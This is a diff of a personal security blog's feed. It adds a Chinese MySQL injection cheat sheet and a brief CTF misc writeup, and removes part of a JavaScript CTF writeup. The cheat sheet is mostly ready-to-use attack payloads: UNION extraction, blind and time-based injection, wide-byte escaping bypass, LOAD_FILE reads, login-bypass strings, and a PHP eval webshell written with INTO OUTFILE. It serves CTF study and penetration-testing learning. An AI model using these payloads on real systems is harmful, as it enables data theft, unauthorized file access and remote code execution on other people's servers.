@@ -106,6 +106,213 @@
   </entry>
   
   <entry>
+    <title>MySql注入备忘录</title>
+    <link href="http://yoursite.com/2017/07/21/MySql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/"/>
+    <id>http://yoursite.com/2017/07/21/MySql注入备忘录/</id>
+    <published>2017-07-21T06:43:02.000Z</published>
+    <updated>2017-07-22T01:45:18.431Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h1 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h1><h2 id="查看当前数据库版本"><a href="#查看当前数据库版本" class="headerlink" title="查看当前数据库版本"></a>查看当前数据库版本</h2><ul>
+<li>VERSION()</li>
+<li>@@VERSION</li>
+<li>@@GLOBAL.VERSION</li>
+</ul>
+<h2 id="当前登录用户"><a href="#当前登录用户" class="headerlink" title="当前登录用户"></a>当前登录用户</h2><ul>
+<li>USER()</li>
+<li>CURRENT_USER()</li>
+<li>SYSTEM_USER()</li>
+<li>SESSION_USER()</li>
+</ul>
+<h2 id="当前使用的数据库"><a href="#当前使用的数据库" class="headerlink" title="当前使用的数据库"></a>当前使用的数据库</h2><ul>
+<li>DATABASE()</li>
+<li>SCHEMA()</li>
+</ul>
+<h2 id="路径相关"><a href="#路径相关" class="headerlink" title="路径相关"></a>路径相关</h2><ul>
+<li>@@BASEDIR : mysql安装路径：</li>
+<li>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径：</li>
+<li>@@DATADIR : 数据存储路径：</li>
+<li>@@CHARACTER_SETS_DIR : 字符集设置文件路径</li>
+<li>@@LOG_ERROR : 错误日志文件路径：</li>
+<li>@@PID_FILE : pid-file文件路径</li>
+<li>@@BASEDIR : mysql安装路径：</li>
+<li>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径：</li>
+</ul>
+<h2 id="联合数据"><a href="#联合数据" class="headerlink" title="联合数据"></a>联合数据</h2><ul>
+<li>CONCAT()</li>
+<li>GROUP_CONCAT()</li>
+<li>CONCAT_WS()</li>
+</ul>
+<h2 id="字母-数字相关"><a href="#字母-数字相关" class="headerlink" title="字母/数字相关"></a>字母/数字相关</h2><ul>
+<li>ASCII(): 获取字母的ascii码值</li>
+<li>BIN(): 返回值的二进制串表示</li>
+<li>CONV(): 进制转换</li>
+<li>FLOOR()</li>
+<li>ROUND()</li>
+<li>LOWER()：转成小写字母</li>
+<li>UPPER(): 转成大写字母</li>
+<li>HEX():十六进制编码</li>
+<li>UNHEX()：十六进制解码</li>
+</ul>
+<h2 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h2><ul>
+<li>MID()</li>
+<li>LEFT()</li>
+<li>SUBSTR()</li>
+<li>SUBSTRING()</li>
+</ul>
+<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><h3 id="行间注释"><a href="#行间注释" class="headerlink" title="行间注释"></a>行间注释</h3><ul>
+<li>— -  (—后面有个空格)<ul>
+<li>DROP sampletable;—</li>
+</ul>
+</li>
+<li>#<ul>
+<li>DROP sampletable;#</li>
+</ul>
+</li>
+<li>` (反引号)</li>
+</ul>
+<h3 id="行内注释"><a href="#行内注释" class="headerlink" title="行内注释"></a>行内注释</h3><ul>
+<li>/* */<br>  +DROP/* 内容 */sampletable;</li>
+<li>/*! 语句  */<ul>
+<li>/*! select * from test */</li>
+<li>语句会被执行</li>
+</ul>
+</li>
+</ul>
+<h1 id="注入技术"><a href="#注入技术" class="headerlink" title="注入技术"></a>注入技术</h1><h2 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h2><p>假设有: www.test.com/chybeta.php?id=1</p>
+<h3 id="数值型注入"><a href="#数值型注入" class="headerlink" title="数值型注入"></a>数值型注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">chybeta.php?id=1+1</div><div class="line">chybeta.php?id=-1 or 1=1</div><div class="line">chybeta.php?id=-1 or 10-2=8</div><div class="line">chybeta.php?id=1 and 1=2</div><div class="line">chybeta.php?id=1 and 1=1</div></pre></td></tr></table></figure>
+<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>参数被引号包围，我们需要闭合引号。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">chybeta.php?id=1&apos;</div><div class="line">chybeta.php?id=1&quot;</div><div class="line">chybeta.php?id=1&apos; and &apos;1&apos;=&apos;1</div><div class="line">chybeta.php?id=1&quot; and &quot;1&quot;=&quot;1</div></pre></td></tr></table></figure></p>
+<h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><h3 id="查询列数"><a href="#查询列数" class="headerlink" title="查询列数"></a>查询列数</h3><p>用UNION SELECT注入时，若后面要注出的数据的列与原数据列数不同，则会失败。所以需要先猜解列数。</p>
+<h4 id="UNION-SELECT"><a href="#UNION-SELECT" class="headerlink" title="UNION SELECT"></a>UNION SELECT</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">UNION SELECT 1,2,3 #</div><div class="line">UNION ALL SELECT 1,2,3 #</div><div class="line">UNION ALL SELECT null,null,null #</div></pre></td></tr></table></figure>
+<h4 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h4><p>利用二分法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ORDER BY 10 #</div><div class="line">ORDER BY 5  #</div><div class="line">ORDER BY 2  #</div><div class="line">....</div></pre></td></tr></table></figure></p>
+<h3 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UNION SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA #</div></pre></td></tr></table></figure>
+<h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() #</div></pre></td></tr></table></figure>
+<p>假设获取到数据库名为”databasename”后，对其进行十六进制编码得到0x64617461626173656e616d65。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x64617461626173656e616d65 #</div></pre></td></tr></table></figure></p>
+<h3 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h3><p>由前一步获取到表名为tablename后，对其进行十六进制编码得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UNION SELECT GROUP_CONCAT(column_name SEPARATOR+0x3c62723e) FROM+INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x7461626c656e616d65 #</div></pre></td></tr></table></figure></p>
+<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UNION SELECT GROUP_CONCAT(column_1,column_2 SEPARATOR+0x3c62723e) FROM databasename.tablename #</div></pre></td></tr></table></figure>
+<h2 id="insert-update-delete注入"><a href="#insert-update-delete注入" class="headerlink" title="insert/update/delete注入"></a>insert/update/delete注入</h2><h2 id="order-by后注入"><a href="#order-by后注入" class="headerlink" title="order by后注入"></a>order by后注入</h2><p>此部分整理自<a href="http://static.hx99.net/static/drops/tips-123.html" target="_blank" rel="external">瞌睡龙:MySql注入科普</a><br>oder by由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假。</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>一般带有oder或者orderby的变量很可能是这种注入，在知道一个字段的时候可以采用如下方式注入：</p>
+<p>原始链接：<a href="http://www.test.com/list.php?order=vote" target="_blank" rel="external">http://www.test.com/list.php?order=vote</a> 根据vote字段排序。</p>
+<p>找到投票数最大的票数num然后构造以下链接，看排序是否变化。：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">list.php?order=abs(vote-(length(user())&gt;0)*num)+asc</div></pre></td></tr></table></figure></p>
+<p>还有一种方法不需要知道任何字段信息，使用rand函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">list.php?order=rand(true)</div><div class="line">list.php?order=rand(false)</div></pre></td></tr></table></figure></p>
+<p>以上两个会返回不同的排序。</p>
+<p>判断表名中第一个字符是否小于128的语句如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)&lt;=128))</div></pre></td></tr></table></figure></p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="盲注场景"><a href="#盲注场景" class="headerlink" title="盲注场景"></a>盲注场景</h3><p>在许多情况下，通过前面的测试会发现页面没有回显提取的数据，但是根据语句是否执行成功与否会有一些相应的变化。</p>
+<ul>
+<li>正确/错误的语句使得页面有适度的变化。可以尝试使用布尔注入</li>
+<li>正确语句返回正常页面，错误的语句返回通用错误页面。可以尝试使用布尔注入。</li>
+<li>提交错误语句，不影响页面的正常输出。建议尝试使用延时注入。</li>
+</ul>
+<p>几种简单的判断语句，在真实利用中需要根据情况而变化:</p>
+<ul>
+<li>CASE</li>
+<li>IF()</li>
+<li>IFNULL()</li>
+<li>NULLIF()</li>
+</ul>
+<h3 id="布尔盲注-基于响应"><a href="#布尔盲注-基于响应" class="headerlink" title="布尔盲注-基于响应"></a>布尔盲注-基于响应</h3><p>提交一个逻辑判断语句，来推断一个个的信息位。由于注入需要（一般）一个个字符的进行，所以需要利用脚本，或者工具（比如burp suite）。以下是：</p>
+<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">// i 用于提取每一个位，j 用于判断其对应的ASCII码值的范围。</div><div class="line">// k ，结合limit，选择偏移为k的行</div><div class="line">// **中可以填上其他的select语句，比如查询表名，列名，数据。一次类推。</div><div class="line">// SUBSTR() 也可以换成 SUBSTRING()</div><div class="line"></div><div class="line">&apos; OR (SELECT ASCII(SUBSTR(DATABASE(),i,1) ) &lt; j) #</div><div class="line"></div><div class="line">&apos; OR (SELECT ASCII(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) ) &lt; j) #  </div><div class="line"></div><div class="line">&apos; OR (SELECT SUBSTR(DATABASE(),i,1) &lt; j) #</div><div class="line"></div><div class="line">&apos; OR (SELECT SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j) #  </div><div class="line"></div><div class="line">&apos; OR SUBSTR((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT k,1),i,1) &lt; j #</div><div class="line"></div><div class="line">...</div></pre></td></tr></table></figure>
+<h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><p>脚本利用，可见：<a href="https://chybeta.github.io/2017/07/16/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-web-writeup/#CTF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95" target="_blank" rel="external">ctf盲注利用脚本</a><br>要点：</p>
+<ul>
+<li>注意编码问题</li>
+<li>注意异常处理</li>
+<li>注意边界处理</li>
+</ul>
+<h3 id="延时盲注-基于时间"><a href="#延时盲注-基于时间" class="headerlink" title="延时盲注-基于时间"></a>延时盲注-基于时间</h3><p>一般会用到几个函数。使用这些的效果，是为了延缓mysql的操作，从而检测到与平时有异的情况：</p>
+<ul>
+<li>SLEEP(n) 让mysql停n秒钟</li>
+<li>BENCHMARK(count,expr) 重复countTimes次执行表达式expr</li>
+</ul>
+<p>一些注意事项：</p>
+<ul>
+<li>使用基于时间的盲注比较不准确，因为这还取决于当前的网络环境。</li>
+<li>时间延缓最好不要超过30秒，否则容易导致mysql的API连接超时。</li>
+<li>当在页面上看不到任何明显变化时，再考虑选择使用延时注入。</li>
+</ul>
+<h4 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1 OR SLEEP(25)=0 LIMIT 1 #</div><div class="line">1) OR SLEEP(25)=0 LIMIT 1 #</div><div class="line">1&apos; OR SLEEP(25)=0 LIMIT 1 #</div><div class="line">&apos;) OR SLEEP(25)=0 LIMIT 1 #</div><div class="line">1)) OR SLEEP(25)=0 LIMIT 1 #</div><div class="line">SELECT SLEEP(25) #</div></pre></td></tr></table></figure>
+<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,BENCHMARK(100000,SHA1(1)),0)</div><div class="line"></div><div class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,SLEEP(10),0)</div><div class="line"></div><div class="line">...</div></pre></td></tr></table></figure>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>有如下php代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">mysql_query(<span class="string">"SET NAMES 'gbk'"</span>);</div><div class="line">....</div><div class="line">$name = <span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) ? addslashes($_GET[<span class="string">'name'</span>]) : <span class="number">1</span>;</div><div class="line">$sql = <span class="string">"SELECT * FROM test WHERE names='&#123;$name&#125;'"</span>;</div></pre></td></tr></table></figure></p>
+<p>addslashes()会在单引号或双引号前加上一个<code>\</code>。当mysql使用GBK字符集时，会把两个字符当作一个汉字，如%df%5c为運字。我们输入<code>name=root%df%27</code>，%在服务器端会出现如下转换：<code>root%df%27</code> -&gt; <code>root%df%5c%27</code> -&gt; <code>root運&#39;</code>。</p>
+<p>更多内容可见：<a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" target="_blank" rel="external">浅析白盒审计中的字符编码及SQL注入</a></p>
+<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><h4 id="吃掉"><a href="#吃掉" class="headerlink" title="吃掉\"></a>吃掉<code>\</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">index.php?name=1%df&apos;</div><div class="line">index.php?name=1%a1&apos;</div><div class="line">index.php?name=1%aa&apos;</div><div class="line">...</div></pre></td></tr></table></figure>
+<p>在被addslashes后，出现%XX%5c，当前一个字符的ascii码值大于128时，会被认为是一个宽字符，即使它不是个汉字。所以不是仅仅%df可以吃掉’\‘。</p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用\"></a>利用<code>\</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.php?name=%**%5c%5c%27</div></pre></td></tr></table></figure>
+<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p>利用sql注入可以导入导出文件，获取文件内容，或向文件写入内容。<br>查询用户读写权限：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT file_priv FROM mysql.user WHERE user = &apos;username&apos;;</div></pre></td></tr></table></figure></p>
+<h3 id="load-file-读取"><a href="#load-file-读取" class="headerlink" title="load_file()读取"></a>load_file()读取</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ul>
+<li>需要有读取文件的权限</li>
+<li>需要知道文件的绝对物理路径。</li>
+<li>要读取的文件大小必须小于 max_allowed_packet</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT @@max_allowed_packet;</div></pre></td></tr></table></figure>
+<h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h4><p>直接使用绝对路径,注意对路径中斜杠的处理。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">UNION SELECT LOAD_FILE(&quot;C://TEST.txt&quot;) #</div><div class="line"></div><div class="line">UNION SELECT LOAD_FILE(&quot;C:/TEST.txt&quot;) #</div><div class="line"></div><div class="line">UNION SELECT LOAD_FILE(&quot;C:\\TEST.txt&quot;) #</div></pre></td></tr></table></figure></p>
+<p>使用编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">UNION SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116)) #</div><div class="line"></div><div class="line">UNION SELECT LOAD_FILE(0x433a5c5c544553542e747874) #</div></pre></td></tr></table></figure></p>
+<h3 id="select导出"><a href="#select导出" class="headerlink" title="select导出"></a>select导出</h3><h4 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h4><ul>
+<li>一般要指定绝对路径</li>
+<li>需导出的目录有可写权限</li>
+<li>要outfile出的文件不能已经存在</li>
+</ul>
+<h4 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">UNION SELECT DATABASE() INTO OUTFILE &apos;C:\\phpstudy\\WWW\\test\\1&apos;;</div><div class="line"></div><div class="line">UNION SELECT DATABASE() INTO OUTFILE &apos;C:/phpstudy/WWW/test/1&apos;;</div></pre></td></tr></table></figure>
+<h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h4><h5 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a>条件</h5><ul>
+<li>需要知道网站的绝对物理路径，这样导出后的webshell可访问</li>
+<li>对需导出的目录有可写权限。</li>
+</ul>
+<h5 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UNION SELECT  &quot;&lt;?php eval($_POST[&apos;chybeta&apos;])?&gt;&quot; INTO OUTFILE &apos;C:/phpstudy/WWW/test/webshell.php&apos;;</div></pre></td></tr></table></figure>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h2 id="万能密码后台登陆"><a href="#万能密码后台登陆" class="headerlink" title="万能密码后台登陆"></a>万能密码后台登陆</h2><ul>
+<li>admin’ —</li>
+<li>admin’ #</li>
+<li>admin’/*</li>
+<li>or ‘=’ or</li>
+<li>‘ or 1=1—</li>
+<li>‘ or 1=1#</li>
+<li>‘ or 1=1/*</li>
+<li>‘) or ‘1’=’1—</li>
+<li>‘) or (‘1’=’1—</li>
+</ul>
+<h1 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h1><p>请见：<a href="https://chybeta.gitbooks.io/waf-bypass/content/sql-injection/ji-ben-guo-waf-zi-shi-hui-zong.html" target="_blank" rel="external">WAF Bypass:SQL Injection</a></p>
+<h2 id="sqlmap-tamper编写"><a href="#sqlmap-tamper编写" class="headerlink" title="sqlmap-tamper编写"></a>sqlmap-tamper编写</h2><h1 id="版本特性"><a href="#版本特性" class="headerlink" title="版本特性"></a>版本特性</h1><ul>
+<li>mysql5.0以后  information.schema库出现</li>
+<li>mysql5.1以后 udf 导入xx\lib\plugin\ 目录下</li>
+<li>mysql5.x以后 system执行命令</li>
+</ul>
+<h1 id="常见sql注入位置"><a href="#常见sql注入位置" class="headerlink" title="常见sql注入位置"></a>常见sql注入位置</h1><ul>
+<li>常见GET、POST参数</li>
+<li>登陆框</li>
+<li>http头</li>
+</ul>
+<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="自动sql注入测试"><a href="#自动sql注入测试" class="headerlink" title="自动sql注入测试"></a>自动sql注入测试</h2><ul>
+<li><a href="http://sqlmap.org/" target="_blank" rel="external">sqlmap</a></li>
+<li>Pangolin</li>
+<li>啊D</li>
+</ul>
+<h2 id="辅助工具"><a href="#辅助工具" class="headerlink" title="辅助工具"></a>辅助工具</h2><ul>
+<li><a href="https:s//portswigger.net/burp/" target="_blank" rel="external">Burp Suite</a></li>
+<li><a href="https://addons.mozilla.org/en-US/firefox/addon/hackbar1/?src=search" target="_blank" rel="external">firefox::HackBar</a></li>
+</ul>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="http://websec.ca/kb/sql_injection#MySQL_Testing_Injection" target="_blank" rel="external">MySQL_Testing_Injection</a></li>
+<li><a href="http://www.sqlinjectionwiki.com/Categories/2/mysql-sql-injection-cheat-sheet/" target="_blank" rel="external">MySQL SQL Injection Cheat Sheet</a></li>
+<li><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#Enablecmdshell" target="_blank" rel="external">SQL Injection Cheat Sheet</a></li>
+<li><a href="https://www.waitalone.cn/mysql-injection-summary.html" target="_blank" rel="external">独自等待：MySQL注入总结</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;h1 id=&quot;基本&quot;&gt;&lt;a href=&quot;#基本&quot; class=&quot;headerlink&quot; title=&quot;基本&quot;&gt;&lt;/a&gt;基本&lt;/h1&gt;&lt;h2 id
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="web" scheme="http://yoursite.com/tags/web/"/>
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Meenpwn-2017-crypto-writeup</title>
     <link href="http://yoursite.com/2017/07/19/Meenpwn-2017-crypto-writeup/"/>
     <id>http://yoursite.com/2017/07/19/Meenpwn-2017-crypto-writeup/</id>
@@ -215,12 +422,27 @@
     <link href="http://yoursite.com/2017/07/17/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-misc-writeup/"/>
     <id>http://yoursite.com/2017/07/17/XMAN选拔赛-2017-misc-writeup/</id>
     <published>2017-07-17T13:37:52.000Z</published>
-    <updated>2017-07-17T13:37:52.391Z</updated>
+    <updated>2017-07-20T02:16:11.653Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Pretty-Cat"><a href="#Pretty-Cat" class="headerlink" title="Pretty_Cat"></a>Pretty_Cat</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">好可爱的喵</div><div class="line">附件下载</div></pre></td></tr></table></figure>
+<p>strings看一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop# strings e539200b-6833-4ff1-96b8-11bff3e1e740.jpg</div><div class="line">JFIF</div><div class="line">pExif</div><div class="line">WE1BTntVNWU=</div><div class="line">XzN4MWZ0b28xfQ==</div><div class="line"> , #&amp;&apos;)*)</div></pre></td></tr></table></figure></p>
+<p>对两个base64加密串进行解密并拼接。得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;U5e_3x1ftoo1&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="Pdf-Hack"><a href="#Pdf-Hack" class="headerlink" title="Pdf_Hack"></a>Pdf_Hack</h1>]]></content>
     
     <summary type="html">
     
+      &lt;h1 id=&quot;Pretty-Cat&quot;&gt;&lt;a href=&quot;#Pretty-Cat&quot; class=&quot;headerlink&quot; title=&quot;Pretty_Cat&quot;&gt;&lt;/a&gt;Pretty_Cat&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;t
+    
     </summary>
     
+      <category term="MISC" scheme="http://yoursite.com/categories/MISC/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
     
   </entry>
   
@@ -1143,51 +1365,6 @@
       <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
     
       <category term="web" scheme="http://yoursite.com/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ringzer0team-js-writeup</title>
-    <link href="http://yoursite.com/2017/06/30/%C2%96ringzer0team-js-writeup/"/>
-    <id>http://yoursite.com/2017/06/30/ringzer0team-js-writeup/</id>
-    <published>2017-06-30T05:19:46.000Z</published>
-    <updated>2017-06-30T08:17:42.740Z</updated>
-    
-    <content type="html"><![CDATA[<p>未完待续..待续..<br><a id="more"></a></p>
-<h1 id="Client-side-validation-is-so-secure"><a href="#Client-side-validation-is-so-secure" class="headerlink" title="Client side validation is so secure?"></a>Client side validation is so secure?</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/1.jpg?raw=true" alt=""></p>
-<p>查看源代码，发现下面的js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">		<span class="comment">// Look's like weak JavaScript auth script :)</span></div><div class="line">		$(<span class="string">".c_submit"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">			event.preventDefault()</div><div class="line">			<span class="keyword">var</span> u = $(<span class="string">"#cuser"</span>).val();</div><div class="line">			<span class="keyword">var</span> p = $(<span class="string">"#cpass"</span>).val();</div><div class="line">			<span class="keyword">if</span>(u == <span class="string">"admin"</span> &amp;&amp; p == <span class="built_in">String</span>.fromCharCode(<span class="number">74</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">83</span>,<span class="number">99</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">112</span>,<span class="number">116</span>,<span class="number">73</span>,<span class="number">115</span>,<span class="number">83</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">101</span>)) &#123;</div><div class="line">				<span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;   </div><div class="line">					<span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + p;</div><div class="line">				&#125;</div><div class="line">			&#125; <span class="keyword">else</span> &#123;</div><div class="line">				$(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert 